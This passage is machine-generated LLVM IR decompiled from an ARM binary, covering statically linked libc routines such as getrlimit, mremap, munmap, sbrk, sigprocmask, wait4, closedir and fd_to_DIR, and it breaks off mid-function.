  %v2_120d8 = ptrtoint i32* %stack_var_-16 to i32
  %v2_120e4 = call i32 @getrlimit(i32 7, i32 %v2_120d8)
  %v1_120e8 = icmp slt i32 %v2_120e4, 0
  %v5_120ec = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_120e8, i32 256, i32 %v5_120ec
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_12110 = load i32, i32* @r0, align 4
  ret i32 %v1_12110
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_12124 = load i32, i32* @r0, align 4
  ret i32 %v1_12124
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_12138 = load i32, i32* @r0, align 4
  ret i32 %v1_12138
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12168, label %dec_label_pc_12150

dec_label_pc_12150:                               ; preds = %entry
  %v1_12154 = sub i32 0, %arg1
  %v3_12158 = load i16, i16* @global_var_24070.401, align 2
  %v4_12158 = sext i16 %v3_12158 to i32
  %v0_1215c = call i32 @__aeabi_read_tp()
  %v3_12160 = add i32 %v4_12158, %v0_1215c
  %v4_12160 = inttoptr i32 %v3_12160 to i32*
  store i32 %v1_12154, i32* %v4_12160, align 4
  br label %dec_label_pc_12168

dec_label_pc_12168:                               ; preds = %entry, %dec_label_pc_12150
  %v1_1216c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_12150 ]
  ret i32 %v1_1216c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12168, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12174 = load i32, i32* @r7, align 4
  store i32 %v3_12174, i32* %stack_var_-8, align 4
  %v0_12180 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12180, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12180, -4095
  br i1 %tmp, label %dec_label_pc_121a8, label %dec_label_pc_12190

dec_label_pc_12190:                               ; preds = %entry
  %v0_12194 = call i32 @__aeabi_read_tp()
  %v3_12198 = load i16, i16* @global_var_24070.401, align 2
  %v4_12198 = sext i16 %v3_12198 to i32
  %v0_1219c = load i32, i32* %r2.global-to-local, align 4
  %v1_1219c = sub i32 0, %v0_1219c
  store i32 %v1_1219c, i32* %r2.global-to-local, align 4
  %v3_121a0 = add i32 %v4_12198, %v0_12194
  %v4_121a0 = inttoptr i32 %v3_121a0 to i32*
  store i32 %v1_1219c, i32* %v4_121a0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_121a8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_121a8

dec_label_pc_121a8:                               ; preds = %entry, %dec_label_pc_12190
  %v1_121ac = phi i32 [ %v0_12180, %entry ], [ -1, %dec_label_pc_12190 ]
  %v2_121a8 = phi i32 [ %v3_12174, %entry ], [ %v2_121a8.pre, %dec_label_pc_12190 ]
  store i32 %v2_121a8, i32* @r7, align 4
  ret i32 %v1_121ac

; uselistorder directives
  uselistorder i32 %v0_12180, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_121a8, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_121c4 = load i32, i32* @r0, align 4
  ret i32 %v1_121c4
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_121c8 = load i32, i32* @r4, align 4
  store i32 %v3_121c8, i32* %stack_var_-12, align 4
  %v0_121d8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_121d8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_121d8, -4095
  br i1 %tmp, label %dec_label_pc_12200, label %dec_label_pc_121e8

dec_label_pc_121e8:                               ; preds = %entry
  %v0_121ec = call i32 @__aeabi_read_tp()
  %v3_121f0 = load i16, i16* @global_var_24070.401, align 2
  %v4_121f0 = sext i16 %v3_121f0 to i32
  %v0_121f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_121f4 = sub i32 0, %v0_121f4
  store i32 %v1_121f4, i32* %r2.global-to-local, align 4
  %v3_121f8 = add i32 %v4_121f0, %v0_121ec
  %v4_121f8 = inttoptr i32 %v3_121f8 to i32*
  store i32 %v1_121f4, i32* %v4_121f8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12200.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_12200

dec_label_pc_12200:                               ; preds = %entry, %dec_label_pc_121e8
  %v1_12204 = phi i32 [ %v0_121d8, %entry ], [ -1, %dec_label_pc_121e8 ]
  %v2_12200 = phi i32 [ %v3_121c8, %entry ], [ %v2_12200.pre, %dec_label_pc_121e8 ]
  store i32 %v2_12200, i32* @r4, align 4
  ret i32 %v1_12204

; uselistorder directives
  uselistorder i32 %v0_121d8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12200, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1220c = load i32, i32* @r7, align 4
  store i32 %v3_1220c, i32* %stack_var_-8, align 4
  %v0_12218 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12218, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12218, -4095
  br i1 %tmp, label %dec_label_pc_12240, label %dec_label_pc_12228

dec_label_pc_12228:                               ; preds = %entry
  %v0_1222c = call i32 @__aeabi_read_tp()
  %v3_12230 = load i16, i16* @global_var_24070.401, align 2
  %v4_12230 = sext i16 %v3_12230 to i32
  %v0_12234 = load i32, i32* %r2.global-to-local, align 4
  %v1_12234 = sub i32 0, %v0_12234
  store i32 %v1_12234, i32* %r2.global-to-local, align 4
  %v3_12238 = add i32 %v4_12230, %v0_1222c
  %v4_12238 = inttoptr i32 %v3_12238 to i32*
  store i32 %v1_12234, i32* %v4_12238, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12240.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12240

dec_label_pc_12240:                               ; preds = %entry, %dec_label_pc_12228
  %v1_12244 = phi i32 [ %v0_12218, %entry ], [ -1, %dec_label_pc_12228 ]
  %v2_12240 = phi i32 [ %v3_1220c, %entry ], [ %v2_12240.pre, %dec_label_pc_12228 ]
  store i32 %v2_12240, i32* @r7, align 4
  ret i32 %v1_12244

; uselistorder directives
  uselistorder i32 %v0_12218, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12240, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1224c = load i32, i32* @r7, align 4
  store i32 %v3_1224c, i32* %stack_var_-8, align 4
  %v0_12258 = load i32, i32* @r0, align 4
  store i32 %v0_12258, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12258, -4095
  br i1 %tmp, label %dec_label_pc_12280, label %dec_label_pc_12268

dec_label_pc_12268:                               ; preds = %entry
  %v0_1226c = call i32 @__aeabi_read_tp()
  %v3_12270 = load i16, i16* @global_var_24070.401, align 2
  %v4_12270 = sext i16 %v3_12270 to i32
  %v0_12274 = load i32, i32* %r2.global-to-local, align 4
  %v1_12274 = sub i32 0, %v0_12274
  store i32 %v1_12274, i32* %r2.global-to-local, align 4
  %v3_12278 = add i32 %v4_12270, %v0_1226c
  %v4_12278 = inttoptr i32 %v3_12278 to i32*
  store i32 %v1_12274, i32* %v4_12278, align 4
  %v2_12280.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12280

dec_label_pc_12280:                               ; preds = %entry, %dec_label_pc_12268
  %v1_12284 = phi i32 [ %v0_12258, %entry ], [ -1, %dec_label_pc_12268 ]
  %v2_12280 = phi i32 [ %v3_1224c, %entry ], [ %v2_12280.pre, %dec_label_pc_12268 ]
  store i32 %v2_12280, i32* @r7, align 4
  ret i32 %v1_12284

; uselistorder directives
  uselistorder i32 %v0_12258, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12280, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_12298 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 15400) to i32*), align 4
  %v2_1229c = icmp eq i32 %v4_12298, 0
  %v3_122a0 = load i32, i32* @r4, align 4
  %v9_122a0 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1229c, label %dec_label_pc_122b0, label %entry.dec_label_pc_122b8_crit_edge

entry.dec_label_pc_122b8_crit_edge:               ; preds = %entry
  br label %dec_label_pc_122b8

dec_label_pc_122b0:                               ; preds = %entry
  store i32 %v3_122a0, i32* @r4, align 4
  store i32 %v9_122a0, i32* @r6, align 4
  %v0_122b4 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_122b8

dec_label_pc_122b8:                               ; preds = %entry.dec_label_pc_122b8_crit_edge, %dec_label_pc_122b0
  %v0_122b8 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_122b8, i32* @r5, align 4
  %v0_122c4 = load i32, i32* @r4, align 4
  store i32 %v0_122c4, i32* @r0, align 4
  %v0_122c8 = call i32 @__syscall_nanosleep()
  store i32 %v0_122c8, i32* @r4, align 4
  %v0_122d0 = load i32, i32* @r5, align 4
  %v1_122d4 = call i32 @__libc_disable_asynccancel(i32 %v0_122d0)
  %v0_122d8 = load i32, i32* @r4, align 4
  ret i32 %v0_122d8

; uselistorder directives
  uselistorder label %dec_label_pc_122b8, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_122ec = load i32, i32* @r4, align 4
  store i32 %v3_122ec, i32* %stack_var_-16, align 4
  store i32 14348, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* %r4.global-to-local, align 4
  %v4_122fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 14348) to i32*), align 4
  %v2_12300 = icmp eq i32 %v4_122fc, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_12300, label %dec_label_pc_1230c, label %dec_label_pc_1231c

dec_label_pc_1230c:                               ; preds = %entry
  %v1_12310 = call i32 @__GI_brk(i32 0)
  %v1_12314 = icmp slt i32 %v1_12310, 0
  br i1 %v1_12314, label %dec_label_pc_12340, label %dec_label_pc_1231cthread-pre-split

dec_label_pc_1231cthread-pre-split:               ; preds = %dec_label_pc_1230c
  %v0_12320.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_1231c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1231c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1231c

dec_label_pc_1231c:                               ; preds = %dec_label_pc_1231cthread-pre-split, %entry
  %v1_1231c = phi i32 [ %v1_1231c.pre, %dec_label_pc_1231cthread-pre-split ], [ 14348, %entry ]
  %v0_1231c = phi i32 [ %v0_1231c.pre, %dec_label_pc_1231cthread-pre-split ], [ ptrtoint (i32* @global_var_24010.405 to i32), %entry ]
  %v1_12330 = phi i32 [ %v0_12320.pr, %dec_label_pc_1231cthread-pre-split ], [ %arg1, %entry ]
  %v2_1231c = add i32 %v0_1231c, %v1_1231c
  %v3_1231c = inttoptr i32 %v2_1231c to i32*
  %v4_1231c = load i32, i32* %v3_1231c, align 4
  %v2_12320 = icmp eq i32 %v1_12330, 0
  store i32 %v4_1231c, i32* %r4.global-to-local, align 4
  br i1 %v2_12320, label %dec_label_pc_12344, label %dec_label_pc_1232c

dec_label_pc_1232c:                               ; preds = %dec_label_pc_1231c
  %v2_12330 = add i32 %v4_1231c, %v1_12330
  %v1_12334 = call i32 @__GI_brk(i32 %v2_12330)
  %v1_12338 = icmp slt i32 %v1_12334, 0
  br i1 %v1_12338, label %dec_label_pc_12340, label %dec_label_pc_1232c.dec_label_pc_12344_crit_edge

dec_label_pc_1232c.dec_label_pc_12344_crit_edge:  ; preds = %dec_label_pc_1232c
  %v0_12344.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12344

dec_label_pc_12340:                               ; preds = %dec_label_pc_1232c, %dec_label_pc_1230c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12344

dec_label_pc_12344:                               ; preds = %dec_label_pc_1231c, %dec_label_pc_1232c.dec_label_pc_12344_crit_edge, %dec_label_pc_12340
  %v0_12344 = phi i32 [ %v0_12344.pre, %dec_label_pc_1232c.dec_label_pc_12344_crit_edge ], [ -1, %dec_label_pc_12340 ], [ %v4_1231c, %dec_label_pc_1231c ]
  %v2_12348 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_12348, i32* @r4, align 4
  ret i32 %v0_12344

; uselistorder directives
  uselistorder i32 %v4_1231c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_12344, { 2, 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_1235c = icmp eq i32* %arg2, null
  br i1 %v2_1235c, label %dec_label_pc_123a0, label %dec_label_pc_12370

dec_label_pc_12370:                               ; preds = %entry
  %v2_12370 = load i32, i32* %arg2, align 4
  %v1_12374 = icmp slt i32 %v2_12370, 0
  br i1 %v1_12374, label %dec_label_pc_12388, label %dec_label_pc_1237c

dec_label_pc_1237c:                               ; preds = %dec_label_pc_12370
  %tmp = ptrtoint i32* %arg2 to i32
  %.pre = add i32 %tmp, 4
  %.pre3 = inttoptr i32 %.pre to i32*
  %v3_1237c = load i32, i32* %.pre3, align 4
  %v1_12380 = urem i32 %v3_1237c, 2
  %v2_12380 = icmp eq i32 %v1_12380, 0
  br i1 %v2_12380, label %dec_label_pc_123a0, label %dec_label_pc_12388

dec_label_pc_12388:                               ; preds = %dec_label_pc_12370, %dec_label_pc_1237c
  %v2_12388 = load i32, i32* %arg2, align 4
  %tmp9 = bitcast i32 %v2_12388 to float
  %tmp10 = call float @fabsf(float %tmp9)
  br label %dec_label_pc_123a0

dec_label_pc_123a0:                               ; preds = %dec_label_pc_1237c, %entry, %dec_label_pc_12388
  %tmp11 = icmp ult i32 %arg1, -4095
  br i1 %tmp11, label %dec_label_pc_123d4, label %dec_label_pc_123bc

dec_label_pc_123bc:                               ; preds = %dec_label_pc_123a0
  %v1_123c0 = sub i32 0, %arg1
  %v3_123c4 = load i16, i16* @global_var_24070.401, align 2
  %v4_123c4 = sext i16 %v3_123c4 to i32
  %v0_123c8 = call i32 @__aeabi_read_tp()
  %v3_123cc = add i32 %v4_123c4, %v0_123c8
  %v4_123cc = inttoptr i32 %v3_123cc to i32*
  store i32 %v1_123c0, i32* %v4_123cc, align 4
  br label %dec_label_pc_123d4

dec_label_pc_123d4:                               ; preds = %dec_label_pc_123a0, %dec_label_pc_123bc
  %v1_123dc = phi i32 [ %arg1, %dec_label_pc_123a0 ], [ -1, %dec_label_pc_123bc ]
  ret i32 %v1_123dc

; uselistorder directives
  uselistorder i32* %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %dec_label_pc_123d4, { 1, 0 }
  uselistorder label %dec_label_pc_123a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12388, { 1, 0 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12410, label %dec_label_pc_123f8

dec_label_pc_123f8:                               ; preds = %entry
  %v1_123fc = sub i32 0, %arg1
  %v3_12400 = load i16, i16* @global_var_24070.401, align 2
  %v4_12400 = sext i16 %v3_12400 to i32
  %v0_12404 = call i32 @__aeabi_read_tp()
  %v3_12408 = add i32 %v4_12400, %v0_12404
  %v4_12408 = inttoptr i32 %v3_12408 to i32*
  store i32 %v1_123fc, i32* %v4_12408, align 4
  br label %dec_label_pc_12410

dec_label_pc_12410:                               ; preds = %entry, %dec_label_pc_123f8
  %v1_12414 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_123f8 ]
  ret i32 %v1_12414

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12410, { 1, 0 }
}

define i32 @__GI_closedir(i32* %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_12420 = load i32, i32* %arg1, align 4
  store i32 %v2_12420, i32* %r3.global-to-local, align 4
  %v3_12428 = icmp eq i32 %v2_12420, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r6, align 4
  br i1 %v3_12428, label %dec_label_pc_1243c, label %dec_label_pc_12458

dec_label_pc_1243c:                               ; preds = %entry
  store i32 72740, i32* %r2.global-to-local, align 4
  %v0_12440 = call i32 @__aeabi_read_tp()
  %v3_12444 = load i16, i16* @global_var_24070.401, align 2
  %v4_12444 = sext i16 %v3_12444 to i32
  store i32 %v4_12444, i32* %r2.global-to-local, align 4
  %v0_12448 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_12448, i32* %r1.global-to-local, align 4
  %v1_1244c = add i32 %v0_12448, 10
  store i32 %v1_1244c, i32* %r3.global-to-local, align 4
  %v3_12450 = add i32 %v4_12444, %v0_12440
  %v4_12450 = inttoptr i32 %v3_12450 to i32*
  store i32 %v1_1244c, i32* %v4_12450, align 4
  %v0_12500.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12500

dec_label_pc_12458:                               ; preds = %entry
  store i32 72, i32* %r3.global-to-local, align 4
  %v1_1245c = add i32 %tmp, 24
  store i32 %v1_1245c, i32* %r2.global-to-local, align 4
  %v4_12464 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 72) to i32*), align 4
  store i32 %v4_12464, i32* %r1.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  %v4_12470 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12470)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_12488 = load i32, i32* @r6, align 4
  %v2_12488 = add i32 %v0_12488, 16
  %v3_12488 = inttoptr i32 %v2_12488 to i32*
  %v4_12488 = load i32, i32* %v3_12488, align 4
  call void @__pseudo_branch(i32 %v4_12488)
  %v0_12494 = load i32, i32* @r7, align 4
  %v1_12494 = inttoptr i32 %v0_12494 to i32*
  %v2_12494 = load i32, i32* %v1_12494, align 4
  store i32 %v2_12494, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_124a4 = load i32, i32* @r8, align 4
  store i32 %v0_124a4, i32* %v1_12494, align 4
  %v0_124a8 = load i32, i32* @r6, align 4
  %v1_124a8 = load i32, i32* %r3.global-to-local, align 4
  %v2_124a8 = add i32 %v1_124a8, %v0_124a8
  %v3_124a8 = inttoptr i32 %v2_124a8 to i32*
  %v4_124a8 = load i32, i32* %v3_124a8, align 4
  store i32 ptrtoint (i32* @global_var_124b4.783 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_124a8)
  %v0_124b4 = load i32, i32* @r7, align 4
  %v1_124b4 = add i32 %v0_124b4, 12
  %v2_124b4 = inttoptr i32 %v1_124b4 to i32*
  %v3_124b4 = load i32, i32* %v2_124b4, align 4
  store i32 %v3_124b4, i32* @r0, align 4
  %v0_124b8 = call i32 @free()
  %v0_124bc = load i32, i32* @r7, align 4
  store i32 %v0_124bc, i32* @r0, align 4
  %v0_124c0 = call i32 @free()
  %v0_124c8 = load i32, i32* @r4, align 4
  store i32 %v0_124c8, i32* %r2.global-to-local, align 4
  %tmp11 = icmp ult i32 %v0_124c8, -4095
  br i1 %tmp11, label %dec_label_pc_124fc, label %dec_label_pc_124e4

dec_label_pc_124e4:                               ; preds = %dec_label_pc_12458
  store i32 72572, i32* %r3.global-to-local, align 4
  %v0_124e8 = call i32 @__aeabi_read_tp()
  %v3_124ec = load i16, i16* @global_var_24070.401, align 2
  %v4_124ec = sext i16 %v3_124ec to i32
  store i32 %v4_124ec, i32* %r3.global-to-local, align 4
  %v0_124f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_124f0 = sub i32 0, %v0_124f0
  store i32 %v1_124f0, i32* %r2.global-to-local, align 4
  %v3_124f4 = add i32 %v4_124ec, %v0_124e8
  %v4_124f4 = inttoptr i32 %v3_124f4 to i32*
  store i32 %v1_124f0, i32* %v4_124f4, align 4
  %v0_124f8 = load i32, i32* @r8, align 4
  br label %dec_label_pc_124fc

dec_label_pc_124fc:                               ; preds = %dec_label_pc_12458, %dec_label_pc_124e4
  %v0_124fc = phi i32 [ %v0_124c8, %dec_label_pc_12458 ], [ %v0_124f8, %dec_label_pc_124e4 ]
  store i32 %v0_124fc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12500

dec_label_pc_12500:                               ; preds = %dec_label_pc_1243c, %dec_label_pc_124fc
  %v0_12500 = phi i32 [ %v0_12500.pre, %dec_label_pc_1243c ], [ %v0_124fc, %dec_label_pc_124fc ]
  ret i32 %v0_12500

; uselistorder directives
  uselistorder i32 %v0_124c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12500, { 1, 0 }
  uselistorder label %dec_label_pc_124fc, { 1, 0 }
}

define i32 @function_12518(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12518:
  %v0_12518 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12518, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_12518
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12518, %bb
  %v10_12528 = phi i32 [ %arg1, %dec_label_pc_12518 ], [ 0, %bb ]
  ret i32 %v10_12528

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @fd_to_DIR(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_1252c = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_12540 = call i32 @malloc(i32 48)
  %v2_12548 = icmp eq i32 %v1_12540, 0
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r6, align 4
  br i1 %v2_12548, label %bb, label %dec_label_pc_12558

bb:                                               ; preds = %entry
  br label %dec_label_pc_125e4

dec_label_pc_12558:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1255c = load i32, i32* @r4, align 4
  %v2_1255c = icmp ugt i32 %v0_1255c, 511
  %v2_12560 = add i32 %v1_12540, 4
  %v3_12560 = inttoptr i32 %v2_12560 to i32*
  store i32 0, i32* %v3_12560, align 4
  %v0_12564 = load i32, i32* %r3.global-to-local, align 4
  %v2_12564 = add i32 %v1_12540, 16
  %v3_12564 = inttoptr i32 %v2_12564 to i32*
  store i32 %v0_12564, i32* %v3_12564, align 4
  %v0_12568 = load i32, i32* %r3.global-to-local, align 4
  %v2_12568 = add i32 %v1_12540, 8
  %v3_12568 = inttoptr i32 %v2_12568 to i32*
  store i32 %v0_12568, i32* %v3_12568, align 4
  br i1 %v2_1255c, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_12558
  %v0_125702 = load i32, i32* @r4, align 4
  %v2_125703 = add i32 %v1_12540, 20
  %v3_125704 = inttoptr i32 %v2_125703 to i32*
  store i32 %v0_125702, i32* %v3_125704, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_12558
  %v1_1256c = load i32, i32* %r3.global-to-local, align 4
  %v2_1256c = add i32 %v1_1256c, 512
  store i32 %v2_1256c, i32* %r3.global-to-local, align 4
  %v0_12570 = load i32, i32* @r4, align 4
  %v2_12570 = add i32 %v1_12540, 20
  %v3_12570 = inttoptr i32 %v2_12570 to i32*
  store i32 %v0_12570, i32* %v3_12570, align 4
  %v1_12574 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_12574, i32* %v3_12570, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_12540, i32* @r5, align 4
  %v0_1257c = load i32, i32* @r7, align 4
  %v2_1257c = inttoptr i32 %v1_12540 to i32*
  store i32 %v0_1257c, i32* %v2_1257c, align 4
  %v0_12580 = load i32, i32* @r5, align 4
  %v1_12580 = add i32 %v0_12580, 20
  %v2_12580 = inttoptr i32 %v1_12580 to i32*
  %v3_12580 = load i32, i32* %v2_12580, align 4
  store i32 %v3_12580, i32* %r1.global-to-local, align 4
  %v2_12588 = call i32 @calloc(i32 1, i32 %v3_12580)
  %v2_1258c = icmp eq i32 %v2_12588, 0
  store i32 %v2_12588, i32* @r4, align 4
  %v1_12594 = load i32, i32* @r5, align 4
  %v2_12594 = add i32 %v1_12594, 12
  %v3_12594 = inttoptr i32 %v2_12594 to i32*
  store i32 %v2_12588, i32* %v3_12594, align 4
  br i1 %v2_1258c, label %dec_label_pc_1259c, label %dec_label_pc_125ac

dec_label_pc_1259c:                               ; preds = %bb17
  %v0_1259c = load i32, i32* @r5, align 4
  store i32 %v0_1259c, i32* @r0, align 4
  %v0_125a0 = call i32 @free()
  %v0_125a4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_125e4

dec_label_pc_125ac:                               ; preds = %bb17
  %v0_125b0 = load i32, i32* @r6, align 4
  %v2_125b0 = add i32 %v0_125b0, -34152
  store i32 %v2_125b0, i32* %r3.global-to-local, align 4
  %v1_125b8 = inttoptr i32 %v2_125b0 to i32*
  %v2_125b8 = load i32, i32* %v1_125b8, align 4
  %v3_125b8 = add i32 %v0_125b0, -34148
  %v4_125b8 = inttoptr i32 %v3_125b8 to i32*
  %v5_125b8 = load i32, i32* %v4_125b8, align 4
  store i32 %v5_125b8, i32* %r1.global-to-local, align 4
  %v6_125b8 = add i32 %v0_125b0, -34144
  %v7_125b8 = inttoptr i32 %v6_125b8 to i32*
  %v8_125b8 = load i32, i32* %v7_125b8, align 4
  store i32 %v8_125b8, i32* %r2.global-to-local, align 4
  %v9_125b8 = add i32 %v0_125b0, -34140
  %v10_125b8 = inttoptr i32 %v9_125b8 to i32*
  %v11_125b8 = load i32, i32* %v10_125b8, align 4
  store i32 %v11_125b8, i32* %r3.global-to-local, align 4
  %v12_125b8 = add i32 %v0_125b0, -34136
  %v1_125c4 = inttoptr i32 %v12_125b8 to i32*
  %v2_125c4 = load i32, i32* %v1_125c4, align 4
  %v3_125c4 = add i32 %v0_125b0, -34132
  %v4_125c4 = inttoptr i32 %v3_125c4 to i32*
  %v5_125c4 = load i32, i32* %v4_125c4, align 4
  store i32 %v2_125c4, i32* %stack_var_-32, align 4
  store i32 %v5_125b8, i32* %r1.global-to-local, align 4
  store i32 %v8_125b8, i32* %r2.global-to-local, align 4
  store i32 %v11_125b8, i32* %r3.global-to-local, align 4
  %v0_125d4 = load i32, i32* @r5, align 4
  %v1_125d4 = add i32 %v0_125d4, 24
  %v1_125d8 = inttoptr i32 %v1_125d4 to i32*
  store i32 %v2_125b8, i32* %v1_125d8, align 4
  %v3_125d8 = add i32 %v0_125d4, 28
  %v4_125d8 = inttoptr i32 %v3_125d8 to i32*
  %v5_125d8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_125d8, i32* %v4_125d8, align 4
  %v6_125d8 = add i32 %v0_125d4, 32
  %v7_125d8 = inttoptr i32 %v6_125d8 to i32*
  %v8_125d8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_125d8, i32* %v7_125d8, align 4
  %v9_125d8 = add i32 %v0_125d4, 36
  %v10_125d8 = inttoptr i32 %v9_125d8 to i32*
  %v11_125d8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_125d8, i32* %v10_125d8, align 4
  %v12_125d8 = add i32 %v0_125d4, 40
  %v2_125dc = load i32, i32* %stack_var_-32, align 4
  store i32 %v5_125c4, i32* %r1.global-to-local, align 4
